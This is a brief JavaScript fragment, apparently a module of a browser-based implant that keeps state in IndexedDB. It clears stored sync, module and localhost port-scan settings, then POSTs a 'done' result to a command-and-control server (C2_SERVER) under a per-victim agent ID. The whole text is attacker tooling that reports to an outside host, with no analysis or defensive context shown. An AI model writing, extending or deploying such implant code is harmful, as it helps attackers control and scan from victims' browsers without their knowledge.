WriteIDB("sync2", 0);
WriteIDB("sync3", 0);
WriteIDB("extra_modules", JSON.stringify({}));
WriteIDB("localhost_port_scan", 1);

data = new FormData();
data.append('result', `done`)
fetch(C2_SERVER + '/module/clear_sw_indexedDB/' + agentID, {
  body: data,
  method: 'POST'
});